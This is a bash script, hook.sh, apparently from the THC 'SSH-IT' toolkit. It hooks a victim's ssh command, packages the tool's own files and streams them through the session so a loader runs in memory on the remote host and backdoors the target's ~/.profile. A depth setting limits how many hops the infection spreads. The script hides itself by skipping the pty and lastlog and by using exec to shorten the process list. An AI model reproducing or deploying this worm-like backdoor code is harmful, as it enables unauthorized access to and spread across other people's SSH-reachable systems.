#! /usr/bin/env bash

# This script is executed when a new remote target needs to be infiltrated.
# 
# It is executed by ptyspy inside a pty-harness. Password authentication is
# completed by ptyspy.
#
# This script transfers all of our data to the remote target and informs ptyspy
# when the target's ~/.profile has been infiltrated - only then will the
# ptyspy continue with the user's original ssh session to log in.

BINDIR="$(cd "$(dirname "${0}")" || exit; pwd)"
source "${BINDIR}/funcs" || exit 254

mk_package()
{
	# Create a deployment binary package 'package.2gz'.
	# - x.sh is executed in memory on the target system. Prepend it to the binary package.
	# - Last append all binary data that is needed on the target system.
	# This binary package is piped into STDIN once THCINSIDE has been encountered
	# by ptyspy.
	FSIZE=$(fsize "${THC_BASEDIR_LOCAL}/x.sh")
	[[ -z $FSIZE ]] && ERREXIT 0 "x.sh not found"

	GTAR_BIN="$(command -v gtar)"
	[[ -z $GTAR_BIN ]] && GTAR_BIN="$(command -v tar)"
	[[ -z $GTAR_BIN ]] && ERREXIT 0 "tar not found"
	[[ $($GTAR_BIN --version) = *GNU* ]] || ERREXIT 0 "GNU tar not found"

	# Check if package.2gz needs to be generated again
	local files
	files="x.sh hook.sh funcs thc_cli ssh_login.sh askpass.sh ptyspy_bin.*"
	(cd "$THC_BASEDIR_LOCAL" 
	if [[ -f "${THC_PACKAGE}" ]]; then
		for f in $files; do
			[[ "$f" -nt "${THC_PACKAGE}" ]] && { rm "${THC_PACKAGE}"; DEBUGF "Removing outdated package.2gz"; break; }
		done
	fi)

	if [[ ! -f "${THC_PACKAGE}" ]]; then
		DEBUGF "Creating new ${THC_PACKAGE}..."
		cat "${THC_BASEDIR_LOCAL}/x.sh" >>"${THC_PACKAGE}"
		(cd "${THC_BASEDIR_LOCAL}" && \
			"${GTAR_BIN}" cfhz - --owner=0 --group=0 $files) >>"${THC_PACKAGE}"
	else
		DEBUGF "Using existing ${THC_PACKAGE}..."
	fi
	FSIZE_BIN=$(($(fsize "${THC_PACKAGE}") - $FSIZE))
	[[ -z $FSIZE_BIN ]] && exit 0
}

# This hook is called whenever the real ssh is executed
# echo THC_DEBUG=${THC_DEBUG}
# echo THC_TARGET=$THC_TARGET
# THC_SSH_PARAM contains the ssh arguments without argv[0] and without '[command]' (e.g. just the arguments to connect) 
# echo THC_SSH_PARAM="${THC_SSH_PARAM}"
# echo THC_SSH_DEST="${THC_SSH_DEST}"
# echo THC_BASEDIR_REL=${THC_BASEDIR_REL}
# echo THC_BASEDIR_LOCAL=${THC_BASEDIR_LOCAL}
# echo THC_PORT=${THC_PORT}

# Check if we are looping (e.g. simplest type of looping: ssh to localhost)
# source "${THC_BASEDIR_LOCAL}/seen_id" 2>/dev/null
# if [[ -n $THC_SEEN_ID ]]; then
# 	[[ -n $THC_SEEN_ID_LOCAL ]] && [[ $THC_SEEN_ID_LOCAL = $THC_SEEN_ID ]] && { echo >&2 "Looping (${THC_SEEN_ID}=${THC_SEEN_ID_LOCAL}"; exit 13; }
# 	echo "THC_SEEN_ID_LOCAL=${THC_SEEN_ID}" >"${THC_BASEDIR_LOCAL}/seen_id"
# fi
# echo "LOOP ID=$THC_SEEN_ID ID_LOCAL=$THC_SEEN_ID_LOCAL"

if [[ "$1" = "install" ]]; then
	# Local install with "./hook.sh install"
	[[ -z $THC_DEPTH ]] && THC_DEPTH=2 # default
	THC_BASEDIR_LOCAL="."
	THC_PACKAGE="${THC_BASEDIR_LOCAL}/package.2gz"
	mk_package


	cat "${THC_PACKAGE}" | THC_FORCE_UPDATE=1 FSIZE_BIN="${FSIZE_BIN}" THC_TESTING="${THC_TESTING}" THC_DEBUG="${THC_DEBUG}" THC_VERBOSE="${THC_VERBOSE}" THC_DEPTH="${THC_DEPTH}" THC_LOCAL=1 bash -c "$(dd ibs=1 count=${FSIZE} 2>/dev/null)" || exit 94
	exit
fi

THC_PACKAGE="${THC_BASEDIR_LOCAL}/package.2gz"

# Do not backdoor if DEPTH has been reached
source "${THC_BASEDIR_LOCAL}/depth.cfg" 2>/dev/null
[[ -z $THC_DEPTH ]] && THC_DEPTH=0 # If not set then assume not to backdoor.
[[ $THC_DEPTH -le 0 ]] && { echo "WARNING: Depth reached (=${THC_DEPTH}). SSH-IT stops here."; exit 0; }

[[ -z $THC_SSH_DEST ]] && exit 0 # no host specified
[[ -z $THC_BASEDIR_REL ]] && exit 0

mk_package

DEBUGF FSIZE=${FSIZE}
DEBUGF FSIZE_BIN=${FSIZE_BIN}
# use -T for 'raw' terminal (no pty, no lastlog)
# NOTE: Use 'exec' to have 1 less process showing up in ps list.
exec "${THC_TARGET}" ${THC_SSH_PARAM} -T "${THC_SSH_DEST}" "echo THCINSIDE && FSIZE_BIN=\"${FSIZE_BIN}\" THC_TESTING=\"${THC_TESTING}\" THC_DEBUG=\"${THC_DEBUG}\" THC_VERBOSE=\"${THC_VERBOSE}\" THC_DEPTH=\"${THC_DEPTH}\" bash -c \"\$(dd ibs=1 count=${FSIZE} 2>/dev/null)\" && echo THCFINISHED"

### NOT REACHED if exec is used above ###
### NOT REACHED if exec is used above ###
### NOT REACHED if exec is used above ###

# "${THC_TARGET}" ${THC_SSH_PARAM} -T "${THC_SSH_DEST}" "echo THCINSIDE && sleep 1 && echo THCFINISHED"
# TEST CASES:
# Test-1.0: ssh fails (terminated)
# exit 0 
# Test-1.1: Never manages to log in
# exec "${THC_TARGET}" ${THC_SSH_PARAM} -T "${THC_SSH_DEST}" "sleep 8"
# Test-1.2: profile backdoor never completes
# exec "${THC_TARGET}" ${THC_SSH_PARAM} -T "${THC_SSH_DEST}" "sleep 1 && echo THCINSIDE"
# exec "${THC_TARGET}" ${THC_SSH_PARAM} -T "${THC_SSH_DEST}" "echo THCINSIDE"
# exec "${THC_TARGET}" ${THC_SSH_PARAM} -T "${THC_SSH_DEST}" "echo THCINSIDE && sleep 8"
exit 0
